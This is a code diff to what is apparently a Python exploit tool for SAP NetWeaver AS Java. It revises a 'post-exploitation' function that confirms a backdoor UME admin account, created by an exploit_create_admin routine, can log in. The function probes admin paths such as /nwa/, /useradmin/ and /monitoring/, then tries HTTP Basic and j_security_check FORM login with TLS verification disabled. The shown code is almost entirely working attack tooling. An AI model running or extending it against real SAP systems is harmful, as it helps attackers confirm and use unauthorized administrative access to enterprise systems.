@@ -354,12 +354,15 @@ def exploit_create_admin(host: str, port: int,
 # Post-exploitation: verify the created user can actually log in
 # ---------------------------------------------------------------------------
 
-# Paths commonly protected by admin-level SAP J2EE authentication.  The
-# first that produces a definitive answer wins.
+# Protected paths probed to trigger FORM login.  Tried in order until
+# one responds — minimum-install Java engines (like some PI-only boxes)
+# do not ship /nwa/, so we fall back to paths that are always present.
 _LOGIN_PROBE_PATHS = (
     "/nwa/",
     "/useradmin/",
     "/webdynpro/resources/sap.com/tc~lm~webadmin~mainframe~wd/MainFrame",
+    "/irj/portal",
+    "/monitoring/",
 )
 
 
@@ -367,53 +370,124 @@ def verify_login(host: str, port: int, username: str, password: str,
                    use_https: bool = False, timeout: float = 15.0) -> dict:
     """Verify that a newly-created UME user can authenticate.
 
-    Uses SAP's standard J2EE FORM-based login (j_security_check) with a
-    cookie jar, since most admin endpoints do not accept HTTP Basic.
-    We interpret the post-submit response:
-      - cookie JSESSIONID issued + URL redirected away from /logon/  → success
-      - response body contains 'logonError*' / 'j_password' field     → failed
-      - status 403 on protected path after login                       → creds
-        accepted but lacks permission (still counts as login-works)
+    Strategy:
+      1. Probe a list of admin-protected paths (NWA, useradmin, portal,
+         monitoring…); use the first one that answers with either a
+         logon page / redirect-to-logon, or accepts our credentials via
+         HTTP Basic.  404 on one path is common on minimum installs —
+         we just move on.
+      2. For the probe that did respond, submit credentials via
+         j_security_check (the standard SAP J2EE FORM login endpoint
+         for that context path — it's typically served on the same
+         context as the protected resource).
+      3. Also try plain HTTP Basic as a final fallback; some AS-Java
+         services accept it directly (e.g. /monitoring/).
 
-    Returns dict:
-        success, http_status, url, evidence
+    Success signals:
+      - POST response carries a JSESSIONID / SAP_SESSIONID cookie AND
+        the final URL is not on /logon/;
+      - OR a Basic-auth GET returns 200/403 (credentials accepted —
+        403 just means the probe path was off-limits to this user).
     """
     import http.cookiejar
     import urllib.parse
 
     result = {"success": False, "http_status": 0, "url": "", "evidence": ""}
-
     base = ("https" if use_https else "http") + f"://{host}:{port}"
     ctx = ssl._create_unverified_context()
+
+    # Step 1 — find a probe path that actually exists on this engine.
+    probe_path = ""
+    probe_status = 0
+    for path in _LOGIN_PROBE_PATHS:
+        try:
+            req = urllib.request.Request(base + path,
+                                           headers={"User-Agent": _UA})
+            with urllib.request.urlopen(req, timeout=timeout,
+                                           context=ctx) as r:
+                probe_status = r.status
+                probe_path = path
+                break
+        except urllib.error.HTTPError as e:
+            if e.code == 404:
+                continue  # path not deployed — try next
+            # 401/403/redirect → path exists and is protected → perfect
+            probe_status = e.code
+            probe_path = path
+            break
+        except Exception:
+            continue
+
+    if not probe_path:
+        result["evidence"] = ("no admin-protected Java endpoint responded "
+                              f"on {base} (tried {', '.join(_LOGIN_PROBE_PATHS)})")
+        return result
+
+    result["url"] = base + probe_path
+    context = probe_path.rstrip("/").split("/")[1] or "nwa"
+
+    # Step 2 — HTTP Basic fallback first (cheap, works for /monitoring/
+    # and /ctc/ endpoints).
+    import base64 as _b64
+    basic = _b64.b64encode(f"{username}:{password}".encode()).decode()
+    try:
+        req = urllib.request.Request(
+            base + probe_path,
+            headers={"User-Agent": _UA,
+                     "Authorization": f"Basic {basic}"})
+        with urllib.request.urlopen(req, timeout=timeout,
+                                       context=ctx) as r:
+            result["http_status"] = r.status
+            if r.status in (200, 204):
+                result["success"] = True
+                result["evidence"] = (f"HTTP Basic auth accepted on "
+                                       f"{probe_path} (status {r.status})")
+                return result
+    except urllib.error.HTTPError as e:
+        if e.code == 401:
+            # Basic auth was actively rejected — a definitive failure,
+            # but ONLY on this path; keep the FORM path alive because
+            # some paths return 401 for basic auth even when FORM works.
+            pass
+        elif e.code == 403:
+            # 403 after basic-auth = credentials accepted, user lacks
+            # authorization for that path.  That still proves login
+            # works.
+            result["http_status"] = 403
+            result["success"] = True
+            result["evidence"] = (f"HTTP Basic auth accepted on "
+                                   f"{probe_path} (403 — user lacks "
+                                   f"permission on this path, but "
+                                   f"credentials are valid)")
+            return result
+    except Exception:
+        pass
+
+    # Step 3 — FORM login via j_security_check, scoped to the context
+    # of the probe path that actually answered.
     cj = http.cookiejar.CookieJar()
     opener = urllib.request.build_opener(
         urllib.request.HTTPCookieProcessor(cj),
         urllib.request.HTTPSHandler(context=ctx),
     )
     opener.addheaders = [("User-Agent", _UA)]
-
-    # Step 1 — trigger the logon flow by hitting /nwa/.
     try:
-        with opener.open(base + "/nwa/", timeout=timeout) as r:
-            r.read()
+        opener.open(base + probe_path, timeout=timeout).read()
     except urllib.error.HTTPError as e:
         try:
             e.read()
         except Exception:
             pass
-    except Exception as e:
-        result["evidence"] = f"cannot reach /nwa/: {e}"
-        return result
+    except Exception:
+        pass
 
-    # Step 2 — submit credentials via j_security_check.
     form = urllib.parse.urlencode({
         "j_username": username,
         "j_password": password,
         "login_submit": "on",
         "uidPasswordLogon": "Log on",
     }).encode("ascii")
-    submit_url = base + "/nwa/j_security_check"
-    result["url"] = submit_url
+    submit_url = f"{base}/{context}/j_security_check"
     try:
         req = urllib.request.Request(
             submit_url, data=form, method="POST",
@@ -431,7 +505,8 @@ def verify_login(host: str, port: int, username: str, password: str,
         final_url = getattr(e, "url", "") or submit_url
         status = e.code
     except Exception as e:
-        result["evidence"] = f"j_security_check POST failed: {e}"
+        result["evidence"] = (f"j_security_check failed on "
+                               f"/{context}/: {e}")
         return result
 
     result["http_status"] = status
@@ -441,7 +516,7 @@ def verify_login(host: str, port: int, username: str, password: str,
     failure_markers = (
         "logonerror", "logon_error", "authentication failed",
         "user authentication failed", "password is incorrect",
-        "incorrect user name", "name=\"j_password\"",
+        "incorrect user name", 'name="j_password"',
     )
     if any(m in body_low for m in failure_markers):
         result["evidence"] = ("SAP logon form returned an error marker — "
@@ -449,7 +524,6 @@ def verify_login(host: str, port: int, username: str, password: str,
         return result
 
     if "/logon/" in (final_url or "").lower():
-        # Still on the logon page → login failed
         result["evidence"] = (f"landed back on logon page ({final_url}) — "
                               "credentials rejected")
         return result
@@ -460,12 +534,14 @@ def verify_login(host: str, port: int, username: str, password: str,
         for c in cj)
     if has_session:
         result["success"] = True
-        result["evidence"] = (f"FORM login succeeded — session cookie "
-                              f"issued, final URL {final_url}")
+        result["evidence"] = (f"FORM login succeeded on /{context}/ — "
+                              f"session cookie issued, final URL "
+                              f"{final_url}")
         return result
 
-    result["evidence"] = (f"ambiguous: status={status}, final_url={final_url}, "
-                          f"no recognised session cookie")
+    result["evidence"] = (f"ambiguous: probe={probe_path} status={status}, "
+                          f"final_url={final_url}, no session cookie, "
+                          f"no Basic acceptance")
     return result
 
 
